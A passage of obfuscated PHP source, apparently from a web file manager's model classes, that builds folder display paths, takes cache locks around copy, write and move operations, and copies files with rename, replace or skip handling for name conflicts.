break; } } unset($°ğÅ£í); } public function groupPathDisplay(&$·ìå°¥) { $²€“ğîÙ =& $_SERVER[ùÆÎÔ“Ñ]; if ($·ìå°¥[$²€“ğîÙ[411]] != self::TYPE_GROUP) { return; } $¯¾»€èÔ = Model($²€“ğîÙ[522])->getInfo($·ìå°¥[$²€“ğîÙ[505]]); $†šÙöœ‹ = $this->parentLevelArray($¯¾»€èÔ[$²€“ğîÙ[521]]); $‰óü¨‡‡ = $²€“ğîÙ[12]; foreach ($†šÙöœ‹ as $çÙÁ°ğ¿) { $‚üŞí = Model($²€“ğîÙ[522])->getInfo($çÙÁ°ğ¿); $‰óü¨‡‡ .= $‚üŞí[$²€“ğîÙ[86]][$²€“ğîÙ[402]] . $²€“ğîÙ[50]; } $·ìå°¥[$²€“ğîÙ[523]] = $¯¾»€èÔ[$²€“ğîÙ[432]]; $·ìå°¥[$²€“ğîÙ[524]] = $¯¾»€èÔ[$²€“ğîÙ[521]]; $·ìå°¥[$²€“ğîÙ[525]] = $¯¾»€èÔ[$²€“ğîÙ[526]]; $·ìå°¥[$²€“ğîÙ[527]] = $‰óü¨‡‡ . $¯¾»€èÔ[$²€“ğîÙ[86]][$²€“ğîÙ[402]]; } protected function _listAppendPath(&$ßêüÊÂ·, $¿äüÑ£î = false) { $…êü×ùÑ =& $_SERVER[ùÆÎÔ“Ñ]; static $ˆ³™ÍÏ« = array(); $Ï©Â’Áç = array(); $à›ñ›„‡ = array(); if ($¿äüÑ£î) { return $ˆ³™ÍÏ«; } foreach ($ßêüÊÂ· as &$»šÌ”¼ê) { $õ÷µÔÛ = $»šÌ”¼ê[$…êü×ùÑ[402]]; if ($»šÌ”¼ê[$…êü×ùÑ[410]] == $…êü×ùÑ[88] && $»šÌ”¼ê[$…êü×ùÑ[432]] != 0) { $ˆ³™ÍÏ«[$õ÷µÔÛ] = $»šÌ”¼ê[$…êü×ùÑ[32]]; } if ($»šÌ”¼ê[$…êü×ùÑ[410]] == $…êü×ùÑ[88] && $»šÌ”¼ê[$…êü×ùÑ[432]] == 0 && !isset($ˆ³™ÍÏ«[$õ÷µÔÛ])) { $ˆ³™ÍÏ«[$õ÷µÔÛ] = $this->_listAppendPathRoot($»šÌ”¼ê, array()); } if (isset($à›ñ›„‡[$»šÌ”¼ê[$…êü×ùÑ[521]]])) { continue; } $à›ñ›„‡[$»šÌ”¼ê[$…êü×ùÑ[521]]] = !0; $ŞÆšØÔé = $this->parentLevelArray($»šÌ”¼ê[$…êü×ùÑ[521]]); foreach ($ŞÆšØÔé as $÷ÆÌıçí => $ó‡çúíÊ) { if (isset($ˆ³™ÍÏ«[$ó‡çúíÊ])) { continue; } if ($÷ÆÌıçí == 0) { $ˆ³™ÍÏ«[$ó‡çúíÊ] = $this->_listAppendPathRoot($»šÌ”¼ê, $ŞÆšØÔé); } if ($÷ÆÌıçí != 0) { $Ï©Â’Áç[] = $ó‡çúíÊ; } } } unset($»šÌ”¼ê); $Ï©Â’Áç = array_unique($Ï©Â’Áç); if (count($Ï©Â’Áç) > 0) { $½‡ŠİúÑ = array($…êü×ùÑ[417] => array($…êü×ùÑ[418], $Ï©Â’Áç)); if (count($Ï©Â’Áç) == 1) { $¡áàÃ¶Ÿ = $this->sourceInfo($Ï©Â’Áç[0]); $õ‘¯ÕŞ¥ = is_array($¡áàÃ¶Ÿ) ? array($¡áàÃ¶Ÿ) : !1; } else { $õ‘¯ÕŞ¥ = $this->field($…êü×ùÑ[528])->where($½‡ŠİúÑ)->select(); } if (!$õ‘¯ÕŞ¥) { $õ‘¯ÕŞ¥ = array(); } foreach ($õ‘¯ÕŞ¥ as $„‚˜†·) { $ˆ³™ÍÏ«[$„‚˜†·[$…êü×ùÑ[402]]] = $„‚˜†·[$…êü×ùÑ[32]]; } } $Ç»‚øÖ¼ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ûˆÃëÉğ = array(); foreach ($ßêüÊÂ· as &$»šÌ”¼ê) { $Ğûİò  = $»šÌ”¼ê[$…êü×ùÑ[521]]; $¼£ùıÏ = $…êü×ùÑ[12]; if (isset($ûˆÃëÉğ[$Ğûİò ])) { $¼£ùıÏ = $ûˆÃëÉğ[$Ğûİò ]; } else { $ŞÆšØÔé = $this->parentLevelArray($»šÌ”¼ê[$…êü×ùÑ[521]]); foreach ($ŞÆšØÔé as $÷ÆÌıçí => $ó‡çúíÊ) { if (isset($ˆ³™ÍÏ«[$ó‡çúíÊ])) { $¼£ùıÏ .= $ˆ³™ÍÏ«[$ó‡çúíÊ] . $…êü×ùÑ[8]; } } $ûˆÃëÉğ[$Ğûİò ] = $¼£ùıÏ; } $¼£ùıÏ .= $»šÌ”¼ê[$…êü×ùÑ[32]]; if ($»šÌ”¼ê[$…êü×ùÑ[410]] == $…êü×ùÑ[88]) { $¼£ùıÏ .= $…êü×ùÑ[8]; } $»šÌ”¼ê[$…êü×ùÑ[519]] = str_replace($…êü×ùÑ[529], $…êü×ùÑ[8], $¼£ùıÏ); if ($»šÌ”¼ê[$…êü×ùÑ[432]] == $…êü×ùÑ[197]) { $»šÌ”¼ê[$…êü×ùÑ[32]] = trim($ˆ³™ÍÏ«[$»šÌ”¼ê[$…êü×ùÑ[402]]], $…êü×ùÑ[8]); $»šÌ”¼ê[$…êü×ùÑ[519]] = $»šÌ”¼ê[$…êü×ùÑ[32]] . $…êü×ùÑ[8]; } if (intval($»šÌ”¼ê[$…êü×ùÑ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($»šÌ”¼ê, $ŞÆšØÔé, $Ç»‚øÖ¼); } } unset($»šÌ”¼ê); return $ßêüÊÂ·; } private function _listAppendPathRecycle(&$¾ûñó½û, $¾õÉ€ÈÉ, $äü†‰º”) { $ş—Ûå´ù =& $_SERVER[ùÆÎÔ“Ñ]; if (!in_array($äü†‰º”, $¾õÉ€ÈÉ) && $¾ûñó½û[$ş—Ûå´ù[402]] != $äü†‰º”) { return; } $µãé’íß = explode($ş—Ûå´ù[8], trim($¾ûñó½û[$ş—Ûå´ù[519]], $ş—Ûå´ù[8])); $ˆû×ùïı = implode($ş—Ûå´ù[8], array_slice($µãé’íß, 2)); $¾ûñó½û[$ş—Ûå´ù[519]] = $ş—Ûå´ù[8] . LNG($ş—Ûå´ù[530]) . $ş—Ûå´ù[8] . ltrim($ˆû×ùïı, $ş—Ûå´ù[8]); $¾ûñó½û[$ş—Ûå´ù[521]] = $ş—Ûå´ù[531] . implode($ş—Ûå´ù[50], array_slice($¾õÉ€ÈÉ, 1)) . $ş—Ûå´ù[50]; if ($¾ûñó½û[$ş—Ûå´ù[402]] == $äü†‰º”) { $¾ûñó½û[$ş—Ûå´ù[521]] = $ş—Ûå´ù[531]; $¾ûñó½û[$ş—Ûå´ù[432]] = $ş—Ûå´ù[197]; $¾ûñó½û[$ş—Ûå´ù[32]] = LNG($ş—Ûå´ù[530]); } $¾ûñó½û[$ş—Ûå´ù[532]] = $ş—Ûå´ù[533]; } protected function _listAppendPathRoot(&$áš¨ØÚ», $Çêø¹ã…) { $ä“ó¡åŒ =& $_SERVER[ùÆÎÔ“Ñ]; static $ íãƒ·ı = false; $–¿ Éä´ = $ä“ó¡åŒ[12]; if ($áš¨ØÚ»[$ä“ó¡åŒ[411]] == self::TYPE_USER) { if (defined($ä“ó¡åŒ[475]) && $áš¨ØÚ»[$ä“ó¡åŒ[505]] == USER_ID) { $–¿ Éä´ = LNG($ä“ó¡åŒ[534]); if ($ íãƒ·ı === !1) { $ÛÕşºÏ = Model($ä“ó¡åŒ[535])->getInfoFull(USER_ID); $ íãƒ·ı = _get($ÛÕşºÏ, $ä“ó¡åŒ[536], $ä“ó¡åŒ[12]); } if ($Çêø¹ã… && $Çêø¹ã…[0] == $ íãƒ·ı || !$Çêø¹ã… && $áš¨ØÚ»[$ä“ó¡åŒ[402]] == $ íãƒ·ı) { $–¿ Éä´ = LNG($ä“ó¡åŒ[537]); $áš¨ØÚ»[$ä“ó¡åŒ[538]] = $ä“ó¡åŒ[539]; } if (!$Çêø¹ã…) { $áš¨ØÚ»[$ä“ó¡åŒ[32]] = $–¿ Éä´; } } else { $ß±à·Èœ = Model($ä“ó¡åŒ[513])->getInfoSimple($áš¨ØÚ»[$ä“ó¡åŒ[505]]); $–¿ Éä´ = LNG($ä“ó¡åŒ[540]) . $ä“ó¡åŒ[162] . $ß±à·Èœ[$ä“ó¡åŒ[32]] . $ä“ó¡åŒ[164]; $áš¨ØÚ»[$ä“ó¡åŒ[541]] = array($ä“ó¡åŒ[32] => $ß±à·Èœ[$ä“ó¡åŒ[32]], $ä“ó¡åŒ[542] => $ß±à·Èœ[$ä“ó¡åŒ[542]], $ä“ó¡åŒ[543] => $ß±à·Èœ[$ä“ó¡åŒ[543]]); } } else { if ($áš¨ØÚ»[$ä“ó¡åŒ[411]] == self::TYPE_GROUP) { $ß±à·Èœ = Model($ä“ó¡åŒ[522])->getInfoSimple($áš¨ØÚ»[$ä“ó¡åŒ[505]]); $–¿ Éä´ = $ß±à·Èœ[$ä“ó¡åŒ[32]]; } else { if ($áš¨ØÚ»[$ä“ó¡åŒ[411]] == self::TYPE_SYSTEM) { $–¿ Éä´ = $ä“ó¡åŒ[544]; } } } $–¿ Éä´ = $–¿ Éä´ ? $ä“ó¡åŒ[8] . $–¿ Éä´ . $ä“ó¡åŒ[8] : $ä“ó¡åŒ[8]; return $–¿ Éä´; } protected function _listAppendUser(&$Á…Ñë) { $ÌòØŒüÚ =& $_SERVER[ùÆÎÔ“Ñ]; $ÔÌ¸­½ = array_to_keyvalue($Á…Ñë, $ÌòØŒüÚ[12], $ÌòØŒüÚ[454]); $îÛ¬¨í¿ = array_to_keyvalue($Á…Ñë, $ÌòØŒüÚ[12], $ÌòØŒüÚ[456]); $„ûŠë²‚ = array_merge($ÔÌ¸­½, $îÛ¬¨í¿); $şÊ×Òéµ = Model($ÌòØŒüÚ[535])->userListInfo($„ûŠë²‚); foreach ($Á…Ñë as &$¡ƒß‰Ã¡) { $Ÿâ³Ö = $¡ƒß‰Ã¡[$ÌòØŒüÚ[454]]; $¡ƒß‰Ã¡[$ÌòØŒüÚ[454]] = $şÊ×Òéµ[$Ÿâ³Ö] ? $şÊ×Òéµ[$Ÿâ³Ö] : !1; $Ÿâ³Ö = $¡ƒß‰Ã¡[$ÌòØŒüÚ[456]]; $¡ƒß‰Ã¡[$ÌòØŒüÚ[456]] = $şÊ×Òéµ[$Ÿâ³Ö] ? $şÊ×Òéµ[$Ÿâ³Ö] : !1; if (isset($¡ƒß‰Ã¡[$ÌòØŒüÚ[466]]) && $¡ƒß‰Ã¡[$ÌòØŒüÚ[466]][$ÌòØŒüÚ[545]]) { $÷õµ¼ë = $GLOBALS[$ÌòØŒüÚ[6]][$ÌòØŒüÚ[89]][$ÌòØŒüÚ[546]]; if ($¡ƒß‰Ã¡[$ÌòØŒüÚ[466]][$ÌòØŒüÚ[547]] <= time() - $÷õµ¼ë) { $this->metaSet($¡ƒß‰Ã¡[$ÌòØŒüÚ[402]], $ÌòØŒüÚ[545], null); $this->metaSet($¡ƒß‰Ã¡[$ÌòØŒüÚ[402]], $ÌòØŒüÚ[547], null); unset($¡ƒß‰Ã¡[$ÌòØŒüÚ[466]][$ÌòØŒüÚ[545]]); continue; } $Ş£×¯Êô = $¡ƒß‰Ã¡[$ÌòØŒüÚ[466]][$ÌòØŒüÚ[545]]; $¡ƒß‰Ã¡[$ÌòØŒüÚ[466]][$ÌòØŒüÚ[548]] = Model($ÌòØŒüÚ[535])->getInfoSimpleOuter($Ş£×¯Êô); } } unset($¡ƒß‰Ã¡); } public function parentLevelArray($•¹»Õ»¼) { $ Õ£ş‘ =& $_SERVER[ùÆÎÔ“Ñ]; $•¹»Õ»¼ = explode($ Õ£ş‘[50], trim($•¹»Õ»¼, $ Õ£ş‘[50])); return array_remove_value($•¹»Õ»¼, $ Õ£ş‘[197]); } public function listAll($Û»Û§ö¼) { $¼ıÚÜêÆ =& $_SERVER[ùÆÎÔ“Ñ]; $‡·Îö‡ = $this->sourceInfo($Û»Û§ö¼); $Ôªª–Ê = array($¼ıÚÜêÆ[549] => array($¼ıÚÜêÆ[550], $‡·Îö‡[$¼ıÚÜêÆ[521]] . $Û»Û§ö¼ . $¼ıÚÜêÆ[551]), $¼ıÚÜêÆ[552] => 0); $øô¥µŸ£ = $¼ıÚÜêÆ[553]; $ıé…Ÿ’³ = "\x4c\x45\106\124\40\x4a\x4f\x49\116\40{$this->tablePrefix}\151\157\137\146\x69\x6c\145\x20\146\151\154\145\x20\157\x6e\x20\163\157\165\x72\x63\145\x2e\x66\151\154\x65\x49\x44\x20\75\40\x66\x69\154\145\56\146\x69\x6c\145\111\104"; $õ¦“÷–µ = $this->alias($¼ıÚÜêÆ[446])->field($øô¥µŸ£)->where($Ôªª–Ê)->join($ıé…Ÿ’³)->select(); $this->_listAppendAuth($õ¦“÷–µ); $this->_listAppendUser($õ¦“÷–µ); $this->_listAppendPath($õ¦“÷–µ); $õ¦“÷–µ = array_to_keyvalue($õ¦“÷–µ, $¼ıÚÜêÆ[402]); $õº“ˆµñ = "\57{$‡·Îö‡[$¼ıÚÜêÆ[32]]}\x2f"; $õº“ˆµñ = $õº“ˆµñ == $¼ıÚÜêÆ[529] ? $¼ıÚÜêÆ[8] : $õº“ˆµñ; $¹¤‘º¹ß = array(); foreach ($õ¦“÷–µ as $åëÆè¤® => $åÁÔ»õë) { $ÕéŠ™îö = $this->parentLevelArray($åÁÔ»õë[$¼ıÚÜêÆ[521]]); array_shift($ÕéŠ™îö); $¸µ³ö½ = $õº“ˆµñ; for ($Æè»Ü¿ = 0; $Æè»Ü¿ < count($ÕéŠ™îö); $Æè»Ü¿++) { $¸µ³ö½ .= $õ¦“÷–µ[$ÕéŠ™îö[$Æè»Ü¿]][$¼ıÚÜêÆ[32]] . $¼ıÚÜêÆ[8]; } $¸µ³ö½ .= $åÁÔ»õë[$¼ıÚÜêÆ[32]]; if ($åÁÔ»õë[$¼ıÚÜêÆ[410]]) { $¸µ³ö½ .= $¼ıÚÜêÆ[8]; } $¸µ³ö½ = str_replace($¼ıÚÜêÆ[529], $¼ıÚÜêÆ[8], $¸µ³ö½); $¸µ³ö½ = str_replace($¼ıÚÜêÆ[529], $¼ıÚÜêÆ[8], $¸µ³ö½); $”®˜¡Ş¸ = array($¼ıÚÜêÆ[421] => str_replace($¼ıÚÜêÆ[529], $¼ıÚÜêÆ[8], $¸µ³ö½), $¼ıÚÜêÆ[554] => intval($åÁÔ»õë[$¼ıÚÜêÆ[410]]), $¼ıÚÜêÆ[86] => $this->pathInfoFilter($åÁÔ»õë)); if (!$åÁÔ»õë[$¼ıÚÜêÆ[410]]) { $”®˜¡Ş¸[$¼ıÚÜêÆ[468]] = $åÁÔ»õë[$¼ıÚÜêÆ[468]]; $”®˜¡Ş¸[$¼ıÚÜêÆ[87]] = $åÁÔ»õë[$¼ıÚÜêÆ[84]]; } $¹¤‘º¹ß[] = $”®˜¡Ş¸; } return $¹¤‘º¹ß; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($²Ÿàûß) { $ÉŠ¬ÎÏŠ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉŠ¬ÎÏŠ[555], $²Ÿàûß); $°¡İÔ£… = 1; $this->_lockEvent($²Ÿàûß, array($ÉŠ¬ÎÏŠ[556], $ÉŠ¬ÎÏŠ[557]), $°¡İÔ£…); $this->_lockParent($²Ÿàûß, array($ÉŠ¬ÎÏŠ[557]), $°¡İÔ£…); $this->_lockEvent($²Ÿàûß, array($ÉŠ¬ÎÏŠ[558], $ÉŠ¬ÎÏŠ[559]), $°¡İÔ£…); $this->_lockCheckEnd($ÉŠ¬ÎÏŠ[555], $²Ÿàûß); } public function lockCopyEnd($¸ƒ‡©‡‡) { $°ÒšõÛã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $ÔëĞ¨¥Ğ = 0; $this->_lockEvent($¸ƒ‡©‡‡, array($°ÒšõÛã[556], $°ÒšõÛã[557]), $ÔëĞ¨¥Ğ); $this->_lockParent($¸ƒ‡©‡‡, array($°ÒšõÛã[557]), $ÔëĞ¨¥Ğ); $this->_lockEvent($¸ƒ‡©‡‡, array($°ÒšõÛã[558], $°ÒšõÛã[559]), $ÔëĞ¨¥Ğ); } public function lockWriteStart($ïÇõëü—, $öŞÓ¥¹¿ = '') { $…Ñˆ‰‰ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($…Ñˆ‰‰[556], $ïÇõëü—); $ÛÁò¦É¨ = 1; $this->_lockKey($…Ñˆ‰‰[560] . $ïÇõëü— . $…Ñˆ‰‰[10] . $öŞÓ¥¹¿, $ÛÁò¦É¨); $this->_lockEvent($ïÇõëü—, array($…Ñˆ‰‰[555], $…Ñˆ‰‰[557]), $ÛÁò¦É¨); $this->_lockParent($ïÇõëü—, array($…Ñˆ‰‰[555], $…Ñˆ‰‰[557]), $ÛÁò¦É¨); $this->_lockCheckEnd($…Ñˆ‰‰[556], $ïÇõëü—); } public function lockWriteEnd($İ–î‘Áò, $å±›Ë¡Ú = '') { $’Õô¢‹ã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $«¯À³££ = 0; $this->_lockKey($’Õô¢‹ã[560] . $İ–î‘Áò . $’Õô¢‹ã[10] . $å±›Ë¡Ú, $«¯À³££); $this->_lockEvent($İ–î‘Áò, array($’Õô¢‹ã[555], $’Õô¢‹ã[557]), $«¯À³££); $this->_lockParent($İ–î‘Áò, array($’Õô¢‹ã[555], $’Õô¢‹ã[557]), $«¯À³££); } public function lockMoveStart($¢¸É¼Œ…) { $æµúşŒµ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($æµúşŒµ[557], $¢¸É¼Œ…); $¸ıÛªÜÔ = 1; $this->_lockKey($æµúşŒµ[561] . $¢¸É¼Œ…, $¸ıÛªÜÔ); $this->_lockEvent($¢¸É¼Œ…, array($æµúşŒµ[555], $æµúşŒµ[556]), $¸ıÛªÜÔ); $this->_lockParent($¢¸É¼Œ…, array($æµúşŒµ[555], $æµúşŒµ[557]), $¸ıÛªÜÔ); $this->_lockEvent($¢¸É¼Œ…, array($æµúşŒµ[562], $æµúşŒµ[558], $æµúşŒµ[559]), $¸ıÛªÜÔ); $this->_lockCheckEnd($æµúşŒµ[557], $¢¸É¼Œ…); } public function lockMoveEnd($·ÎÌã‚ä) { $¹ù¢¬¢ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->allowLock()) { return; } $Ë›Ó•‹ = 0; $this->_lockKey($¹ù¢¬¢[561] . $·ÎÌã‚ä, $Ë›Ó•‹); $this->_lockEvent($·ÎÌã‚ä, array($¹ù¢¬¢[555], $¹ù¢¬¢[556]), $Ë›Ó•‹); $this->_lockParent($·ÎÌã‚ä, array($¹ù¢¬¢[555], $¹ù¢¬¢[557]), $Ë›Ó•‹); $this->_lockEvent($·ÎÌã‚ä, array($¹ù¢¬¢[562], $¹ù¢¬¢[558], $¹ù¢¬¢[559]), $Ë›Ó•‹); } private function _lockCheck($¼³·¥€Â, $¸ãõ˜Á) { $£èÏåãğ =& $_SERVER[ùÆÎÔ“Ñ]; $åİ³şÇ = $this->sourceInfo($¸ãõ˜Á); $¼ûÌÍ› = $¼³·¥€Â . $£èÏåãğ[10] . $¸ãõ˜Á; $this->_lockTimeStart[$¼ûÌÍ›] = timeFloat(); if (!is_array($åİ³şÇ)) { return; } $¼ó©îÛÊ = LNG($£èÏåãğ[563]); CacheLock::setErrorMsg($£èÏåãğ[162] . htmlspecialchars($åİ³şÇ[$£èÏåãğ[32]]) . $£èÏåãğ[164] . $¼ó©îÛÊ); $this->_lockKey($¼ûÌÍ›, 1); $this->_lockKey($¼ûÌÍ›, 0); $ı…ê¶«’ = array_reverse($this->parentLevelArray($åİ³şÇ[$£èÏåãğ[521]])); foreach ($ı…ê¶«’ as $œßµÛ÷å) { $¼ûÌÍ› = $¼³·¥€Â . $£èÏåãğ[564] . $œßµÛ÷å; if (CacheLock::lockGet($£èÏåãğ[565] . $¼ûÌÍ›)) { $åİ³şÇ = $this->sourceInfo($œßµÛ÷å); CacheLock::setErrorMsg($£èÏåãğ[162] . htmlspecialchars($åİ³şÇ[$£èÏåãğ[32]]) . $£èÏåãğ[164] . $¼ó©îÛÊ); $this->_lockKey($¼ûÌÍ›, 1); $this->_lockKey($¼ûÌÍ›, 0); } } } private function _lockCheckEnd($¢¯”®Àİ, $…úÃÒŒ©) { $›Ä«‰°á =& $_SERVER[ùÆÎÔ“Ñ]; $õÔ›Ïªô = $¢¯”®Àİ . $›Ä«‰°á[10] . $…úÃÒŒ©; CacheLock::setErrorMsg($›Ä«‰°á[378]); if (!isset($this->_lockTimeStart[$õÔ›Ïªô])) { return; } $·‰ÊÍµ™ = timeFloat() - $this->_lockTimeStart[$õÔ›Ïªô]; unset($this->_lockTimeStart[$õÔ›Ïªô]); if ($·‰ÊÍµ™ > 0.5) { unset(self::$cacheSourceInfo[$›Ä«‰°á[460] . $…úÃÒŒ©]); } $š‹…Šé­ = $this->sourceInfo($…úÃÒŒ©); if (!$š‹…Šé­) { show_json(LNG($›Ä«‰°á[105]), !1); } } private function _lockParent($ª¥”ºá¸, $°˜àÊªË, $Û´¡ÀìÇ) { if (!$this->autoLockSet) { return; } $É¤¨º¯… = $this->sourceInfo($ª¥”ºá¸); if (!is_array($É¤¨º¯…)) { return; } $ºçû©İê = array_reverse($this->parentLevelArray($É¤¨º¯…[$_SERVER[ùÆÎÔ“Ñ][521]])); foreach ($ºçû©İê as $„±û…‚À) { $this->_lockEvent($„±û…‚À, $°˜àÊªË, $Û´¡ÀìÇ); } } private function _lockEvent($úÒ¢™ª, $·Í‰•È, $Ğ³ã‡ÃÁ) { $®öÁ¹€ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->autoLockSet) { return; } foreach ($·Í‰•È as $¼™¦Ñğ¤) { $¸ÓØÜİ“ = $¼™¦Ñğ¤ . $®öÁ¹€[10] . $úÒ¢™ª; if ($Ğ³ã‡ÃÁ && CacheLock::lockGet($®öÁ¹€[565] . $¸ÓØÜİ“)) { continue; } $this->_lockKey($¸ÓØÜİ“, $Ğ³ã‡ÃÁ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($µÃó¼˜›, $å³¯±Ä× = 1) { $ŠšÆÒ´ = $_SERVER[ùÆÎÔ“Ñ][565] . md5($µÃó¼˜›); if ($å³¯±Ä×) { if (isset(self::$_lockItemArr[$ŠšÆÒ´])) { return; } self::$_lockItemArr[$ŠšÆÒ´] = 1; CacheLock::lock($ŠšÆÒ´, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ŠšÆÒ´])) { return; } unset(self::$_lockItemArr[$ŠšÆÒ´]); CacheLock::unlock($ŠšÆÒ´); } } public function isParentOf($÷¶°€Õƒ, $ëüšÌ²) { $ùà†…’¦ =& $_SERVER[ùÆÎÔ“Ñ]; $ˆé› Ğ = $this->sourceInfo($÷¶°€Õƒ); $ÈÂûáü = $this->sourceInfo($ëüšÌ²); $“ÜÃÙÕ’ = $ˆé› Ğ[$ùà†…’¦[521]] . $ˆé› Ğ[$ùà†…’¦[402]] . $ùà†…’¦[50]; $ùúíº¤¥ = $ÈÂûáü[$ùà†…’¦[521]] . $ÈÂûáü[$ùà†…’¦[402]] . $ùà†…’¦[50]; $àÆ‚Åº = strpos($ùúíº¤¥, $“ÜÃÙÕ’) === 0; return $àÆ‚Åº; } private $targetIsDelete = 0; public function copy($·’õÕ¹–, $Õ¾É¼, $¯í¯‰É = REPEAT_REPLACE, $ùª¤Š÷ = '') { $ÅµÄ“şà =& $_SERVER[ùÆÎÔ“Ñ]; $ÖÀ×«âˆ = $this->sourceInfo($·’õÕ¹–); $ÁŸ¾ø¢Ö = $this->sourceInfo($Õ¾É¼); if (!$ÖÀ×«âˆ || !$ÁŸ¾ø¢Ö || $ÁŸ¾ø¢Ö[$ÅµÄ“şà[410]] != $ÅµÄ“şà[88]) { return !1; } if ($this->isParentOf($·’õÕ¹–, $Õ¾É¼)) { return !1; } $ŸöÌ‚ä¯ = $ùª¤Š÷ ? $ùª¤Š÷ : $ÖÀ×«âˆ[$ÅµÄ“şà[32]]; $this->lockCopyStart($·’õÕ¹–); $this->lockWriteStart($Õ¾É¼, $ŸöÌ‚ä¯); $İ›¯£†ƒ = array($ÅµÄ“şà[566] => array(), $ÅµÄ“şà[567] => array(), $ÅµÄ“şà[568] => array()); $this->targetIsDelete = intval($ÖÀ×«âˆ[$ÅµÄ“şà[431]]); $Âæ–¾ÇŠ = $this->fileNameExistCache($Õ¾É¼, $ÖÀ×«âˆ[$ÅµÄ“şà[32]]); $‚²ùŠ‰õ = $this->_copy($·’õÕ¹–, $Õ¾É¼, $¯í¯‰É, $İ›¯£†ƒ, !0, $ùª¤Š÷); $this->_childrenListClear(); $this->lockCopyEnd($·’õÕ¹–); $this->lockWriteEnd($Õ¾É¼, $ŸöÌ‚ä¯); if ($ÖÀ×«âˆ[$ÅµÄ“şà[410]] == $ÅµÄ“şà[88] && $Âæ–¾ÇŠ == $‚²ùŠ‰õ) { $this->folderSizeResetChildren($Âæ–¾ÇŠ); } Model($ÅµÄ“şà[569])->addAll($İ›¯£†ƒ[$ÅµÄ“şà[567]], array(), !0); if ($Âæ–¾ÇŠ != $‚²ùŠ‰õ || $ÖÀ×«âˆ[$ÅµÄ“şà[410]] == $ÅµÄ“şà[88]) { Model($ÅµÄ“şà[570])->eventCopy($‚²ùŠ‰õ); } $this->saveAll($İ›¯£†ƒ[$ÅµÄ“şà[568]]); Model($ÅµÄ“şà[199])->linkAdd($İ›¯£†ƒ[$ÅµÄ“şà[566]]); $this->folderSizeReset($Õ¾É¼); $this->updateModifyTime($Õ¾É¼); return $‚²ùŠ‰õ; } private function _copy($™œúƒÖ, $À±¬Óš, $ê»ò­¦Ë, &$úÍ²¡··, $¼ÚáÇ‚è, $÷ËŒÂ¿ = '') { $…â¶ö—ª =& $_SERVER[ùÆÎÔ“Ñ]; $ö¼±¯É‡ = $this->sourceInfoCache($™œúƒÖ); $­ì¥­“³ = $ö¼±¯É‡[$…â¶ö—ª[410]] == $…â¶ö—ª[88]; $Ó®ü¾•µ = $÷ËŒÂ¿ ? $÷ËŒÂ¿ : $ö¼±¯É‡[$…â¶ö—ª[32]]; $¸ÂÍ§Æ® = $this->fileNameExistCache($À±¬Óš, $Ó®ü¾•µ); if ($¼ÚáÇ‚è) { $this->_childrenAllMake($™œúƒÖ); if ($­ì¥­“³ && $¸ÂÍ§Æ®) { $this->_childrenAllMake($¸ÂÍ§Æ®); } } if (!$¸ÂÍ§Æ®) { return $this->_copyCreate($™œúƒÖ, $À±¬Óš, $Ó®ü¾•µ, $úÍ²¡··); } $´µõˆß = $¸ÂÍ§Æ®; if ($­ì¥­“³) { if ($ê»ò­¦Ë == REPEAT_RENAME_FOLDER) { $Ó®ü¾•µ = $this->fileNameAutoCache($À±¬Óš, $Ó®ü¾•µ, $ê»ò­¦Ë, $­ì¥­“³); $´µõˆß = $this->_copyCreate($™œúƒÖ, $À±¬Óš, $Ó®ü¾•µ, $úÍ²¡··); } else { $È¡Ï±óö = $this->_childrenList($™œúƒÖ); foreach ($È¡Ï±óö as $–Ê»¦Ï¬) { $this->_copy($–Ê»¦Ï¬[$…â¶ö—ª[402]], $¸ÂÍ§Æ®, $ê»ò­¦Ë, $úÍ²¡··, !1); } } } else { if ($ê»ò­¦Ë == REPEAT_RENAME || $ê»ò­¦Ë == REPEAT_RENAME_FOLDER) { $Ó®ü¾•µ = $this->fileNameAutoCache($À±¬Óš, $Ó®ü¾•µ, $ê»ò­¦Ë, $­ì¥­“³); $´µõˆß = $this->_copyCreate($™œúƒÖ, $À±¬Óš, $Ó®ü¾•µ, $úÍ²¡··); } else { if ($ê»ò­¦Ë == REPEAT_REPLACE) { $ç‰µÑÎ = $this->sourceInfoCache($¸ÂÍ§Æ®); $·ÛŸöÂÓ = $this->fileHistory($ç‰µÑÎ, $ö¼±¯É‡[$…â¶ö—ª[468]], $ö¼±¯É‡[$…â¶ö—ª[76]]); if ($·ÛŸöÂÓ) { $úÍ²¡··[$…â¶ö—ª[566]][] = $ö¼±¯É‡[$…â¶ö—ª[468]]; } } else { if ($ê»ò­¦Ë == REPEAT_SKIP) { } } } Hook::trigger($…â¶ö—ª[571], array($…â¶ö—ª[572], $ö¼±¯É‡, 0)); } return $´µõˆß; } private function _copyCreate($÷·äĞ›ô, $Ê³ĞˆÃ, $ñÔÙğ’, &$©Š«º”û) { $‚°£íÔ =& $_SERVER[ùÆÎÔ“Ñ]; $®€æßŒ‰ = $this->sourceInfoCache($÷·äĞ›ô); $ÇÈúïõ³ = $this->sourceInfoCache($Ê³ĞˆÃ); $€°®•ˆÒ = $this->_makeItemData($®€æßŒ‰, $ÇÈúïõ³, $ñÔÙğ’); Hook::trigger($‚°£íÔ[573], $€°®•ˆÒ); Hook::trigger($‚°£íÔ[574], array($‚°£íÔ[575], $€°®•ˆÒ, 0)); $áü¾Ğ…ü = $this->add($€°®•ˆÒ); $Ï¾í×£ = array($‚°£íÔ[402] => $áü¾Ğ…ü, $‚°£íÔ[32] => $ñÔÙğ’); $this->_copyApplyMeta($Ï¾í×£, $©Š«º”û); if ($®€æßŒ‰[$‚°£íÔ[410]] != $‚°£íÔ[88]) { $©Š«º”û[$‚°£íÔ[566]][] = 